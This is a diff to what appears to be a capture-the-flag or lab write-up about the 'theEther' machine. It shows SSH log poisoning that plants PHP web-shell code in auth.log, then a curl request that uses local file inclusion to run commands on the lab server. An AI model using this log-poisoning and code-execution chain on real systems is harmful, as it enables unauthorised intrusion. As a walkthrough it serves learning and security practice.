@@ -115,3 +115,9 @@ This worked, and I could see the word "test" appearing in the contents of auth.l
 ssh "<?php \$a=\$_GET['a']?>"@192.168.56.101
 ssh "<?php echo system(\$a)?> "@192.168.56.101
 ```
+
+I was able to test this with the following curl command:
+
+curl "http://192.168.56.101/index.php?file=/var/log/auth.log&a=ls"
+
+This worked, giving me access to the contents of the `/var/www/html/theEther.com/public_html/` directory.
